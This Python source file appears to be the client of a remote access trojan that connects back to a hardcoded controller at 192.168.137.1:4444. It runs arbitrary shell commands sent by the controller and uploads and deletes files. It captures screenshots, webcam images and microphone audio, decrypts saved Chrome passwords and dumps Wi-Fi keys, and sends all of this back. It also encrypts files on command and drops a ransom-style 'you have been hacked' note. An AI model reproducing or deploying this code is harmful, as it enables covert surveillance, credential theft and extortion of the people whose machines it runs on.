import os
import socket
import subprocess
import time
import webbrowser 
import pyautogui
import time
from datetime import timezone, datetime, timedelta
import pyaudio
import wave
import cv2
from PIL import Image
import shutil
import sqlite3
import sys
import platform
import cryptography
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import secrets
import base64
from io import BytesIO
import json
from win32 import win32crypt
import contextlib
import re
from collections import namedtuple
import configparser

def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode('utf-8') == 'cd':
            try:
                directory = data[3:].decode('utf-8').strip()
                os.chdir(directory)
                s.send(str.encode("Directory changed to: " + os.getcwd()))
            except Exception as e:
                error_msg = "Failed to change directory: " + str(e)
                s.send(str.encode(error_msg))
        elif data[:].decode('utf-8') == 'quit':
            s.close()
            break
        elif data[:].decode('utf-8').startswith('browse'):
            url = data[7:].decode('utf-8').strip()
            webbrowser.open(url)
            s.send(b'Browsing completed')
            receive_commands()
        elif data[:].decode('utf-8').startswith('download'):
            filename = data[9:].decode('utf-8').strip()
            download_file(filename)
            receive_commands()
        elif data[:].decode('utf-8').startswith('delete'):
            filename = data[7:].decode('utf-8').strip()
            delete(filename)
        elif data[:].decode('utf-8').startswith('upload'):
            filename = data[7:].decode('utf-8').strip()
            upload_file(filename)
        elif data[:].decode('utf-8').startswith('encrypt'):
            filename = data[8:].decode('utf-8').strip()
            #password = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
            encrypt_file(filename)
            #download_file(f'{filename}.salt')
        elif data[:].decode('utf-8').startswith('decrypt'):
            filename = data[8:].decode('utf-8').strip()
            #password = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
            decrypt_file(filename)
        elif data[:].decode('utf-8').startswith('screenshot'):
            filename = data[11:].decode('utf-8').strip()
            screenshot(filename)
        elif data[:].decode('utf-8').startswith('record'):
            filename = data[7:].decode('utf-8').strip()
            seconds = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
            recording(filename,seconds)
        elif data[:].decode('utf-8').startswith('savedpass'):
            filename = data[9:].decode('utf-8').strip()
            savedpass(filename)
        elif data[:].decode('utf-8').startswith('wifipass'):
            filename = data[9:].decode('utf-8').strip()
            wifipass(filename)
        elif data[:].decode('utf-8').startswith('webcam'):
            filename = data[7:].decode('utf-8').strip()
            webcam(filename)
        elif len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
            except:
                output_str = 'Command not recognized' + '\n'
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)

    s.close()



def download_file(filename):
    try:
        if os.path.exists(filename):
            filesize = os.path.getsize(filename)
            filesize = str(filesize)
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                s.send(str.encode(filesize))
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))


def upload_file(filename):
    try:
        s.send(str.encode(filename))
        response = s.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            with open(filename, 'wb') as file:
                while True:
                    data = s.recv(1024)
                    if data == b'Done':
                        print('File downloaded successfully')
                        break
                    file.write(data)
    except Exception as e:
        print('Error occurred while downloading the file:', str(e))



def delete(filename):
    try:
        s.send(str.encode(filename))
        response = s.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the client machine')
        else:
            try:
                os.remove(filename)
                print('Done Deleting')
            except:
                print('NotFound')
    except Exception as e:
        print('Error occurred while deleting the file:', str(e))

def screenshot(filename):
    pic = pyautogui.screenshot()
    #filename = filename + '.png' 
    pic.save(filename)
    try:
        
        if os.path.exists(filename):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove(filename)
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))

def webcam(filename):
    

    # Create a VideoCapture object
    cap = cv2.VideoCapture(0)

    # Check if the webcam is opened correctly
    if not cap.isOpened():
        print("Cannot open webcam")
        exit()

    # Read a frame from the webcam
    ret, frame = cap.read()

    # If the frame is read correctly
    if ret:
        # Convert the frame to RGB format
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

        # Create a PIL Image from the frame
        image = Image.fromarray(rgb_frame)

        # Save the captured image to a file
        image.save(f'{filename}.jpg')
        print("Image captured!")

    # Release the VideoCapture object
    cap.release()



    try:
        
        if os.path.exists(f'{filename}.jpg'):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(f'{filename}.jpg', 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove(f'{filename}.jpg')
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))





def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)


def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())


def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()


def generate_key(password, load_existing_salt=False, save_salt=True):
    """
    Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt"
    """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt()
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


def encrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and writes it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def decrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it decrypts the file and writes it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except:
        print("Invalid password. Decryption failed.")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
    print("File decrypted successfully")




def encrypt_file(filename):
    try:
        s.send(str.encode(filename))
        response = s.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            password = s.recv(1024).decode()
            key =generate_key(password, load_existing_salt=False)
            encrypt(filename,key)
    except Exception as e:
        print('Error occurred while encrypting the file:', str(e))

    with open('salt.salt', "rb") as file:
        # read all file data
        file_data = file.read()
    
    
    # write the encrypted file
    with open(f'{filename}.salt', "wb") as file:
        file.write(file_data)
    os.remove('salt.salt')
    
    RIPPED = "WELL WELL, LOOKS LIKE YOU HAVE BEEN HACKED AND YOU NEED TO DO SOMETHING.\n" "YOUR FILE " f'{filename}' " HAS BEEN ENCRYPTED"
    outfile = open(f'{filename}.txt', "w")
    outfile.write(RIPPED)
    outfile.close()
    
    try:
        
        if os.path.exists(f'{filename}.salt'):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(f'{filename}.salt', 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove(f'{filename}.salt')
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))

def decrypt_file(filename):
    # try:
    #     s.send(str.encode(f'{filename}.salt'))
    #     response = s.recv(1024).decode()
    #     if response == 'FileNotFound':
    #         print('File not found on the remote server')
    #     else:

    #         with open(f'{filename}.salt', 'wb') as file:
    #             while True:
    #                 data = s.recv(1024)
    #                 if data == b'Done':
    #                     print('File downloaded successfully')
    #                     break
                    
    #                 file.write(data)
    #         os.rename(f'{filename}.salt','salt.salt')


    # except Exception as e:
    #     print('Error occurred while downloading the file:', str(e))

    try:
        
        s.send(str.encode(filename))
        response = s.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            password = s.recv(1024).decode()
            key = generate_key(password,load_existing_salt=True)
            decrypt(filename,key)
    except Exception as e:
        print('Error occurred while decrypting the file:', str(e))



def recording(filename,seconds):
    chunk = 1024
    sample_format = pyaudio.paInt16
    chanels = 2
    smpl_rt = 44400
    pa = pyaudio.PyAudio()

    stream = pa.open(format=sample_format, channels = chanels,
                 rate = smpl_rt, input=True,
                 frames_per_buffer=chunk)

    print('Recording....')
    frames = []

    for i in range(0, int(smpl_rt / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()

    pa.terminate()

    print('Done !!! ')

    sf = wave.open(filename, 'wb')
    sf.setnchannels(chanels)
    sf.setsampwidth(pa.get_sample_size(sample_format))
    sf.setframerate(smpl_rt)
    sf.writeframes(b''.join(frames))
    sf.close()
    try:
        
        if os.path.exists(filename):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove(filename)
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))





def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main_chrome():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def savedpass(filename):
    try:
        username = os.environ.get("USERNAME")
        with open("savedpass.txt",'w') as f:
            with contextlib.redirect_stdout(f):
                print(main_chrome())
    except:
        pass



    try:
        
        if os.path.exists('savedpass.txt'):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                s.send(str.encode(username))
                with open('savedpass.txt', 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove('savedpass.txt')

        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))







def get_windows_saved_ssids():
    """Returns a list of saved SSIDs in a Windows machine using netsh command"""
    # get all saved profiles in the PC
    output = subprocess.check_output("netsh wlan show profiles").decode()
    ssids = []
    profiles = re.findall(r"All User Profile\s(.*)", output)
    for profile in profiles:
        # for each SSID, remove spaces and colon
        ssid = profile.strip().strip(":").strip()
        # add to the list
        ssids.append(ssid)
    return ssids


def get_windows_saved_wifi_passwords(verbose=1):
    """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
    command in Windows
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
    """
    ssids = get_windows_saved_ssids()
    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
    profiles = []
    for ssid in ssids:
        ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
        # get the ciphers
        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
        # clear spaces and colon
        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
        # get the Wi-Fi password
        key = re.findall(r"Key Content\s(.*)", ssid_details)
        # clear spaces and colon
        try:
            key = key[0].strip().strip(":").strip()
        except IndexError:
            key = "None"
        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
        if verbose >= 1:
            print_windows_profile(profile)
        profiles.append(profile)
    return profiles


def print_windows_profile(profile):
    """Prints a single profile on Windows"""
    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")


def print_windows_profiles(verbose):
    """Prints all extracted SSIDs along with Key on Windows"""
    print("SSID                     CIPHER(S)      KEY")
    get_windows_saved_wifi_passwords(verbose)


def get_linux_saved_wifi_passwords(verbose=1):   
    """Extracts saved Wi-Fi passwords saved in a Linux machine, this function extracts data in the
    `/etc/NetworkManager/system-connections/` directory
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "auth-alg", "key-mgmt", "psk"]
    """
    network_connections_path = "/etc/NetworkManager/system-connections/"
    fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
    Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
    profiles = []
    for file in os.listdir(network_connections_path):
        data = { k.replace("-", "_"): None for k in fields }
        config = configparser.ConfigParser()
        config.read(os.path.join(network_connections_path, file))
        for _, section in config.items():
            for k, v in section.items():
                if k in fields:
                    data[k.replace("-", "_")] = v
        profile = Profile(**data)
        if verbose >= 1:
            print_linux_profile(profile)
        profiles.append(profile)
    return profiles


def print_linux_profile(profile):
    """Prints a single profile on Linux"""
    print(f"{str(profile.ssid):25}{str(profile.auth_alg):5}{str(profile.key_mgmt):10}{str(profile.psk):50}") 


def print_linux_profiles(verbose):
    """Prints all extracted SSIDs along with Key (PSK) on Linux"""
    print("SSID                     AUTH KEY-MGMT  PSK")
    get_linux_saved_wifi_passwords(verbose)
    
    
def print_profiles(verbose=1):
    if os.name == "nt":
        print_windows_profiles(verbose)
    elif os.name == "posix":
        print_linux_profiles(verbose)
    else:
        raise NotImplemented("Code only works for either Linux or Windows")
    
    



def wifipass(filename):
    try:
        username = os.environ.get("USERNAME")
        with open("wifipass.txt",'w') as f:
            with contextlib.redirect_stdout(f):
                print(print_profiles())
    except:
        pass



    try:
        
        if os.path.exists('wifipass.txt'):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                s.send(str.encode(username))
                with open('wifipass.txt', 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove('wifipass.txt')

        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))



def main():
    global s
    hosts = ['192.168.137.1']
    port = 4444
    while True:
        for host in hosts:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                hostname = socket.gethostname()
                s.send(hostname.encode())
                receive_commands()
            except Exception:
                pass
                #print('Error in main')
                #time.sleep(5)
                #s.close()
                #main()


main()
